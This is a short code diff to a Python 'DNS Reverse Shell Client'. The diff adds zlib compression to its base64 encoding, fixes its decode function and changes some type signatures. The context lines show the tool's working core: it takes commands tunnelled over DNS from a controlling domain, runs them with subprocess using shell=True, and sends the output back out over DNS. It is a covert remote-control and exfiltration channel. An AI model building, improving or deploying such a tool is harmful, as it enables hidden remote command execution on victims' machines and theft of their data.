@@ -7,6 +7,7 @@ from time import sleep
 import subprocess
 import threading
 import argparse
+import zlib
 
 parser = argparse.ArgumentParser(description="DNS Reverse Shell Client")
 parser.add_argument('domain', metavar='domain', type=str, help='Domain to connect to')
@@ -52,7 +53,7 @@ recv = b""  # Buffer of received data to process
 
 
 # Execute shell command
-def execute(cmd: bytes) -> bytes:
+def execute(cmd: str) -> bytes:
     out, err = subprocess.Popen([cmd], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                 shell=True).communicate()
 
@@ -82,7 +83,7 @@ def pulse() -> None:
                 if res[DNS].z == 1:
                     cmd = decode(recv)
                     try:
-                        print(cmd.decode())
+                        print(cmd)
                         send_data(execute(cmd))
                     except:
                         print("Data got corrupted!")
@@ -96,15 +97,17 @@ def pulse() -> None:
 # Encode data into base64 and fragment it
 def encode(data: bytes) -> list:
     data = data.strip()
+    data = zlib.compress(data)
     e_data = b64encode(data).decode()
     frag_e_data = [e_data[i:i + FRAG_LEN] for i in range(0, len(e_data), FRAG_LEN)]
     return frag_e_data
 
 
 # Decode base64 data
-def decode(data: bytes) -> bytes:
-    data = b64decode(recv)
-    return data
+def decode(data: bytes) -> str:
+    data = b64decode(data)
+    data = zlib.decompress(data)
+    return data.decode()
 
 
 # Send data over DNS
